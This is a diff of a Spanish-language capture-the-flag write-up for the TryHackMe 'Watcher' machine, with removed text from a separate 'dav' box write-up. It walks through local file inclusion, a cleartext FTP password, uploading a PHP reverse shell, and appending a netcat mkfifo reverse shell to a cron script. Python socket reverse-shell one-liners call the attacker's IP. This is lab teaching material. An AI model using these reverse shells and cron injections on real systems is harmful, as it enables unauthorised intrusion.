@@ -38,255 +38,124 @@ Revisando el directorio **robots.txt** encontramos una ruta, que al abrir, encon
 
 ---
 
-- Flag 2 ->
-Con la segunda ruta obtenida en el directorio **robots.txt** y con la pista, que nos indica que la página es vulnerable a **lfi**, procedemos con los siguientes pasos:
+- Flag 2 -> <https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/>
 
-1. Verificamos la vulnerabilidad con **burpsuite** listando la ruta **/etc/passwd** como se oberva a continuación:
+Con la segunda ruta que obtuvimos en el directorio **robots.txt** y con la pista, que nos indica que la página es vulnerable a **lfi**, procedemos con los siguientes pasos:
+
+1.Verificamos la vulnerabilidad con **burpsuite** listando la ruta **/etc/passwd** como se oberva a continuación:
+
 ![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_1.png)
-2. Con está información, listamos la ruta No. 2 de **robots.txt**, obteniendo un usuario y contraseña **ftp**, como se observa a continuación:
+
+2.Con está información, listamos la ruta No. 2 de **robots.txt**, obteniendo un usuario y contraseña **ftp**, como se observa en la siguiente imagen:
+
 ![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_2.png)
-3. Con el usuario y contraseñas encontrados ingresamos vía **ftp**, listamos los archivos y descargamos la **flag_2.txt** como mostramos a continuación:
+
+3.Con el usuario y contraseñas que encontramos en el paso anterior, ingresamos vía **ftp**, listamos los archivos y descargamos la **flag_2.txt** como mostramos a continuación:
+
 ![flag2](/assets/images/thm-writeup-watcher/watcher_flag2_3.png)
 
 ftpuser:givemefiles777
 ---
 
-- Flag 3 ->
+- Flag 3 -> <https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2>
 
-1. Preparamos una **reverse-shell.php**, descargada de <https://pentestmonkey.net/tools/web-shells/php-reverse-shell> con los datos de la máquina atacante, como observamos a continuación:
+1.Preparamos una **reverse-shell.php**, descargada de <https://pentestmonkey.net/tools/web-shells/php-reverse-shell> con los datos de la máquina atacante, como observamos a continuación:
 
 ![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_1.png)
-2. Procedemos a subirla **rshell.php** al servidor **ftp** como lo muestra la siguiente imagen:
-![flag3](/assets/images/thm-writeup-watcher/watcher_flag3.png)
-3. Nos ponemos en escucha por el puerto configurado, en nuestro caso **4444** con el siguiente comando: **nc -nlvp 4444**
-4. Ejecutamos la **rshell.php**, ejecutando la siguiente ruta <http://watcher.local/post.php?post=/home/ftpuser/ftp/files/php-reverse-rshell.php>, desde burpsuite o desde el navegador:
-dd
-5. dddd
+
+2.Procedemos a subir nuestra reverse shell al servidor **ftp**, con el comando **put**como lo muestra la siguiente imagen:
+
 ![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_2.png)
 
+3.Nos ponemos en escucha por el puerto configurado, en nuestro caso **4444** con el siguiente comando: **nc -nlvp 4444**
 
-~~~css
-└─# nc -nlvp 4444
-listening on [any] 4444 ...
-^Xconnect to [10.9.0.68] from (UNKNOWN) [10.10.69.106] 50632
-Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 03:33:19 up  2:52,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ ls
-/bin/sh: 1: ls: not found
-$ SHELL=/bin/bash script -q /dev/null
-www-data@watcher:/home$ ls
-ls
-ftpuser  mat  toby  will
-www-data@watcher:/home/mat$ find / -type f -name flag_3.txt 2>/dev/null
+4.Ejecutamos la **rshell.php**, con la siguiente ruta <http://watcher.local/post.php?post=/home/ftpuser/ftp/files/php-reverse-rshell.php>, desde burpsuite o desde el navegador:
+
+![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_3.png)
+
+5.Obtenemos la reverse shell y con el comando **SHELL=/bin/bash script -q /dev/null** realizamos el tratamiento de la shell.
+
+6.Con el siguiente comando realizamos la búsqueda de la bandera 3:
+
+~~~go
 find / -type f -name flag_3.txt 2>/dev/null
-/var/www/html/more_secrets_a9f10a/flag_3.txt
-www-data@watcher:/home/mat$ 
-www-data@watcher:/home/mat$ cd /var/www/html/more_secrets_a9f10a/flag_3.txt
-cd /var/www/html/more_secrets_a9f10a/flag_3.txt
-bash: cd: /var/www/html/more_secrets_a9f10a/flag_3.txt: Not a directory
-www-data@watcher:/home/mat$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
-cat /var/www/html/more_secrets_a9f10a/flag_3.txt
-FLAG{lfi_what_a_guy}
-www-data@watcher:/home/mat$                                       
 ~~~
 
-----
-
-
-## 1. Fase de reconocimiento
-
-- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:
-
-~~~css
-ping -c 1 {ip}
-~~~
-
-![ping](/assets/images/thm-writeup-vulnet/vulnet_whatweb.png)
-
-- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.
+![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_4.png)
 
 ---
 
-## 2. Enumeración / Escaneo
+- Flag 4 -> <https://www.explainshell.com/explain?cmd=sudo+-l>
 
-- Escaneo de la totalidad de los ***65535*** puertos de red con el siguiente comando:
+- Con el siguiente comando podemos pasar al usuario "toby"
+
+~~~go
+sudo -u toby /bin/bash
+~~~
+
+- Ya como "toby" obtenemos la bandera:
+
+![flag4](/assets/images/thm-writeup-watcher/watcher_flag4.png)
+
+---
+
+- Flag 5 -> https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+
+5.1 Con base en la lista procedemos a consultar los "crontab":
+
+~~~go
+cat /etc/crontab
+~~~
+
+![flag5](/assets/images/thm-writeup-watcher/watcher_flag5.png)
+
+5.2 Observamos el script "cow.sh", el cual copia una foto entre directorios:
+
+~~~go
+toby@watcher:~/jobs$ cat cow.sh
+cat cow.sh
+#!/bin/bash
+cp /home/mat/cow.jpg /tmp/cow.jpg
+
+~~~
+
+5.3 Nos ponemos en escucha con **nc** en el puerto 555
   
-~~~css
-└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip}
+~~~go
+nc -nlvp 555
 ~~~
 
-![ping](/assets/images/thm-writeup-vulnet/vulnet_nmap1.png)
+5.4 Inyectamos una reverse shell en el script "cow.sh" con el siguiente comando:
 
----
-
-- Escaeno de vulnerabilidades sobre los puertos: 22,111,139,445,873,2049,6379,34583,37021,37295,52355:
-
-~~~css
-nmap -sCV -T4 -p22,111,139,445,873,2049,6379,34583,37021,37295,52355 vuln.local --script vuln
-
-└─#  nmap -v -A -sC -sV -Pn {ip} -p- --script vuln
+~~~go
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.68 5555 >/tmp/f" >> cow.sh
 ~~~
 
----
+5.5 Ejecutamos el script:
 
-- Revisión de la URL ***<http://10.10.25.173:8080/>***:
-
-![url](/assets/images/thm-writeup-dav/dav_url.png)
-
----
-
-## 3. WFUZ
-
-- Escaeno de subdominios con wfuzz:
-
-~~~css
-└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt {ip}/FUZZ/
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                         
-=====================================================================
-000037122:   401        14 L     54 W       460 Ch      "webdav"  
+~~~go
+./cow.sh
 ~~~
 
-- Wfuzz encontró la misma ruta que el escaneo de vulnerabilidades con nmap ***webdav***.
-
----
-
-## 4. Exploit
-
-- Buscando contraseñas por defecto me encontré con la siguiente página que entrega una información importante ***<http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html>***
-
-![url](/assets/images/thm-writeup-dav/dav_web3.png)
-
----
-
-- Cadaver: utilizamos esta aplicación para ingresar al target, con el usuario y contraseña encontrados en el punto anterior, como se observa a continuación:
+5.6 Obtenemos una reverse shell como "mat" y la bandera solicitada:
 
 ~~~css
-cadaver http://10.10.39.111/webdav/ 
-Autenticación requerida para webdav en el servidor '10.10.39.111':
-Nombre de usuario: wampp
-Contraseña: 
-dav:/webdav/> ls
-Listando colección `/webdav/': exitoso.
-        passwd.dav                            44  ago 25  2019
-
-~~~
-
-- Cargamos un archivo de prueba:
-  
-~~~css
-dav:/webdav/> put test.txt
-Transferiendo test.txt a '/webdav/test.txt':
- Progreso: [                              ]   0,0% of 6 bytes Progreso: [=============================>] 100,0% of 6 bytes exitoso.
-
-~~~
-
-- Comprobamos que el archivo que previamente creamos en la misma carpeta donde ejecutamos ***cadaver***
-
-![url](/assets/images/thm-writeup-dav/dav_exploit_1.png)
-
-- Descargamos  y configuramos una rshell desde la siguiente url: ***<https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php>*** en la misma carpeta donde ejecutamos ***cadaver***
-
-![url](/assets/images/thm-writeup-dav/dav_rshell.png)
-
-- Cargamos la rshell siguiendo el mismo procedimiento:
-
-~~~css
-dav:/webdav/> put rshell.php
-Transferiendo rshell.php a '/webdav/rshell.php':
- Progreso: [                              ]   0,0% of 5491 bytes Progreso: [=============================>] 100,0% of 5491 bytes exitoso.
-~~~
-
-- Nos ponemos en escucha por el puerto ***4444***, de acuerdo con la configuración de la rshell:
-
-~~~css
-─# nc -nlvp 4444                                   
-listening on [any] 4444 ...
-~~~
-
-- Ejecutamos la ***rshell.php***, entrando a la url target y abriendo este archivo:
-
-![rshell](/assets/images/thm-writeup-dav/dav_rshell1.png)
-
-dav_rshell1.png
-
-- Obtenemos nuestra reverse shell como usuario ***www-data***:
-
-~~~css
-─# nc -nlvp 4444                                   
-listening on [any] 4444 ...
-connect to [10.9.0.43] from (UNKNOWN) [10.10.39.111] 34204
-Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
- 19:43:11 up 21 min,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
+└─# nc -nlvp 5555
+listening on [any] 5555 ...
+connect to [10.9.0.68] from (UNKNOWN) [10.10.107.245] 40532
+sh: 0: can't access tty; job control turned off
 $ whoami
-www-data
-~~~
-
-- Tratamiento de la shell, con el siguiente comando:
-
-~~~python
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-~~~
-
----
-
-## 5. Bandera de usuario
-
-- Nos dirigimos a la carpeta ***home*** en esta accedmos al usuario ***merlin*** y en está última encontramos el archivo ***user.txt***:
-
-![usr](/assets/images/thm-writeup-dav/dav_usr.png)
-
----
-
-## 6. Bandera root
-
-- Búsqueda de vulnerabilidades con el comando ***sudo -l***, en el cual observamos el binario ***cat*** :
-
-~~~css
-www-data@ubuntu:/usr/lib/openssh$ sudo -l
-sudo -l
-Matching Defaults entries for www-data on ubuntu:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on ubuntu:
-    (ALL) NOPASSWD: /bin/cat
-
-~~~
-
-- Abusando del binario ***cat*** podemos leer la bandera root sin entregar las credenciales respectivas, ubicandonos en el archivo raíz y ejecutando el siguiente comando:
-
-![root](/assets/images/thm-writeup-dav/dav_cat.png)
-
-~~~css
-www-data@ubuntu:/bin$ cd ..
-cd ..
-www-data@ubuntu:/$ ls
+mat
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+mat@watcher:~$ ls
 ls
-bin   etc   initrd.img.old  lost+found  opt   run   sys  var
-boot  home   lib    media       proc  sbin  tmp  vmlinuz
-dev   initrd.img  lib64    mnt       root  srv   usr  vmlinuz.old
-www-data@ubuntu:/$ sudo cat /root/root.txt
-sudo cat /root/root.txt
-??????
+cow.jpg  flag_5.txt  note.txt  scripts
+cat flag_5.txt
+FLAG{????????}
+mat@watcher:~$ 
 ~~~
 
-![root](/assets/images/thm-writeup-dav/dav_root.png)
 
----
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.68",555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > cmd.py
 
-## 7. Fuentes
-
-- Exploit
-<http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html>
-
-- Cat
-<https://gtfobins.github.io/gtfobins/cat/>
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.68",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > cmd.py
